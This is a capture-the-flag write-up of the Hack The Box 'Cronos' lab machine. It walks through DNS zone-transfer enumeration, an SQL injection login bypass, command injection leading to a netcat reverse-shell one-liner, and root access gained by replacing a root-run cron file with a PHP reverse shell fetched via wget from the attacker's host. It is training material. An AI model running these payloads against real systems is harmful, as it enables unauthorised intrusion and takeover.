@@ -1,0 +1,98 @@
+                     Cronos
+
+                                                                                13th October 2017 / Document No D17.100.18
+                                                                                Prepared By: ch4p
+                                                                                Machine Author: ch4p
+                                                                                Difficulty: Medium
+
+Synopsis
+
+Cronos is a medium Linux machine that focuses mainly on different vectors for enumeration and also
+emphasises the risks associated with adding world-writable files to the root crontab. This machine also
+includes an introductory-level SQL injection vulnerability
+
+Skills required
+
+      Linux Fundamentals
+      Enumerating ports and services
+      Enumerating DNS
+
+Skills learned
+
+      SQL Injection
+      Command Injection
+      Exploiting cron jobs
+
+Enumeration
+
+Nmap
+
+The Nmap scan reveals an OpenSSH server, a DNS server and an Apache server. Attempting to view the
+website reveals only the default Apache page.
+
+Dig
+
+We can identify the domain name of the host using the nslookup utility. The syntax would be as follows:
+   nslookup host [server]
+   This command looks up information for host using the specified server. If the host is
+   an Internet address and the query type is A or PTR, the name of the host is returned.
+   If the host is a name and does not have a trailing period (.), the search list is used
+   to qualify the name.
+   nslookup 10.10.10.13 10.10.10.13
+The nslookup result shows that the domain name is cronos.htb .
+We can further enumerate the remaining subdomains by doing a zone transfer. This can be accomplished
+with the command dig axfr @10.10.10.13 cronos.htb after adding cronos.htb to the /etc/hosts
+file.
+
+   dig axfr @10.10.10.13 cronos.htb
+
+After adding admin.cronos.htb to the /etc/hosts file and browsing it, an administrator login page is
+presented.
+
+Initial Foothold
+Login
+
+After some trial and error, it appears that the Username field is vulnerable to SQL injection. By commenting
+out the rest of the statement with the username admin'-- - the login form is bypassed.
+
+Welcome
+
+It does not take long to figure out that the welcome.php page is vulnerable to command injection. Many
+different methods work here, however, the simplest is likely just using a semicolon to add additional
+commands. However, script execution is stopped after the traceroute is run.
+
+By intercepting the response in Burp Suite, it is possible to modify the command entirely.
+After removing the host variable, command injection is now trivial. Replace traceroute with the desired
+command and send the request. Note that URL encoding the command is required in some cases.
+Use the command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc | >/tmp/f to connect
+to a local nc listener, which can be started by using the command nc -nvlp <PORT> .
+
+The user flag can be obtained from /home/noulis/user.txt .
+
+Privilege Escalation
+
+Let us run an enumeration script known as LinEnum. We can transfer the binary from our local host to the
+remote host using a Python server. The LinEnum result shows that there is a PHP file that is being executed
+as a cron job under user root .
+Upon checking the permissions for this PHP file, we see that it is writable by the user www-data .
+   ls -ls /var/www/laravel/artisan
+
+Let us try to replace this file /var/www/laravel/artisan with a PHP reverse shell. Thus, when the cron-job
+runs this file as user root , we will obtain a reverse shell as user root . We can download the PHP reverse
+shell from here and edit the IP address and port parameters accordingly. Let's host it on our local machine
+using a Python server using the following command.
+
+   pyhton3 -m http.server 8000
+We can download the reverse shell file on the remote host using the wget utility. We will traverse to the
+/tmp directory for downloading the file as this directory is writable by all the users by default.
+
+   cd /tmp
+   wget <IP_ADDRESS>:8000/php-reverse-shell.php
+Then replace /var/www/laravel/artisan file with the /tmp/php-reverse-shell.php .
+   mv /tmp/php-reverse-shell.php /var/www/laravel/artisan
+Let's start a listener on the specified port in the reverse shell file on out local host and wait for the reverse
+shell from the box.
+   nc -nvlp 1234
+After waiting for a minute, we receive a reverse shell as user root on the listening port.
+The root flag can be found at /root/root.txt .
+
